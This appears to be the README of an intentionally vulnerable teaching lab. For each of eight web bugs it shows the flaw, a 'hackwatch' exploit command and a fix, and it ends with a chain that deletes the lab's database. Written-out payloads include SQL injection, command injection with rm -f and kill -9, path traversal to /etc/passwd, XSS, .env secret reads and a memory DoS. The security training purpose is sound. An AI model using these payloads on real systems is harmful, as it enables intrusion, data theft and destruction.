# The lab, vulnerability by vulnerability

`target/app.py` is broken on purpose. This document lists each bug, how
`hackwatch` exploits it, and how a real application would fix it.

The rule stays the same everywhere: run this on your own machine, on your own
network, and only ever point the client at the lab.

---

## 1. SQL injection — login bypass (`POST /login`)

**The bug.** The credentials are formatted straight into the query:

```python
query = "SELECT id, username, role FROM users WHERE username = '%s' AND password = '%s'" % (username, password)
```

**Exploit.**

```sh
hackwatch sqli
# payload: ' OR 1=1--
# -> X-Auth: granted, X-Role: admin
```

The password check disappears because everything after `--` is a comment.

**Fix.** Never build SQL with string formatting. Use parameters:

```python
cur.execute("SELECT id, username, role FROM users WHERE username = ? AND password = ?", (username, password))
```

and store password *hashes* (`hashlib.scrypt`/`bcrypt`), not plaintext.

---

## 2. SQL injection — data dump (`GET /user?id=`)

**The bug.** `id` is dropped into the query as an expression:

```python
query = "SELECT id, username, password, role FROM users WHERE id = %s" % ident
```

**Exploit.**

```sh
hackwatch loot
# id=0 UNION SELECT id, username, password, role FROM users
```

**Fix.** Validate that `id` is an integer and use a bind parameter. Even for an
integer, do not trust the client.

---

## 3. Command injection (`GET /ping?host=`)

**The bug.**

```python
command = "ping -c 1 -W 2 " + host
subprocess.run(command, shell=True, ...)
```

**Exploit.**

```sh
hackwatch cmdi id
hackwatch shell                     # interactive
# the nuke payload: rm -f <db>; kill -9 $PPID
```

**Fix.** Do not use `shell=True`. Pass an argument list, validate `host` against
an allow-list, and drop privileges:

```python
subprocess.run(["ping", "-c", "1", "-W", "2", host], ...)
```

---

## 4. Path traversal / LFI (`GET /download?file=`)

**The bug.**

```python
path = os.path.join(FILES_DIR, name)   # `../../` and absolute paths both escape
open(path, "rb")
```

**Exploit.**

```sh
hackwatch lfi ../../etc/passwd
hackwatch lfi /etc/hostname
```

**Fix.** Resolve the path and confirm it is still inside the allowed directory:

```python
path = os.path.realpath(os.path.join(FILES_DIR, name))
if not path.startswith(os.path.realpath(FILES_DIR) + os.sep):
    abort(403)
```

Also reject absolute input before joining.

---

## 5. IDOR / broken access control (`GET /user?id=`)

**The bug.** Any caller can read any user, including the password, with no
authentication or ownership check.

**Exploit.**

```sh
hackwatch cmdi curl -s 'http://127.0.0.1:8000/user?id=1'
```

**Fix.** Require authentication, derive the user from the session rather than
the query string, and never return the password field.

---

## 6. Reflected XSS (`GET /search?q=`)

**The bug.** The query is echoed into the page unescaped:

```python
"<h1>Search results for: %s</h1>" % query
```

**Exploit.** `http://<lab>/search?q=<script>alert(1)</script>` runs the script in
the victim's browser.

**Fix.** HTML-escape all untrusted output (`html.escape`) or use a templating
engine with auto-escaping, and send a Content-Security-Policy.

---

## 7. Sensitive data exposure (`GET /.env`, `GET /.git/config`)

**The bug.** The application serves its own environment file — including the
database path, a secret key and fake cloud credentials — and a git config.

**Exploit.**

```sh
hackwatch recon        # finds /.env and /.git/config
hackwatch nuke --yes   # reads DB_PATH out of /.env
```

**Fix.** Never deploy `.env` or `.git` under the web root. Block dotfiles at
the server, and keep secrets in a secret manager or environment, not a file the
app can serve.

---

## 8. Denial of service (`GET /boom?mb=`)

**The bug.** Unauthenticated, uncapped memory allocation:

```python
ballast = bytearray(megabytes * 1024 * 1024)
```

**Exploit.**

```sh
# careful: this really does eat memory
hackwatch cmdi curl -s 'http://127.0.0.1:8000/boom?mb=999999'
```

`nuke` uses this only as a fallback when the command injection fails.

**Fix.** Require authentication and rate-limit, cap the request size, and never
allocate an attacker-controlled amount.

---

## Attack chain used by `nuke`

```
recon                 -> finds /.env
/.env                 -> leaks DB_PATH
/ping?host=; rm -f DB ; kill -9 $PPID
                      -> database gone, process gone
status                -> DOWN
```

`hackwatch auto --yes` (or just `hack`) runs the whole chain with no stops:
recon, sqli, loot, then the nuke above. Key lines are typed out character by
character unless `HACKWATCH_PLAIN=1` is set.
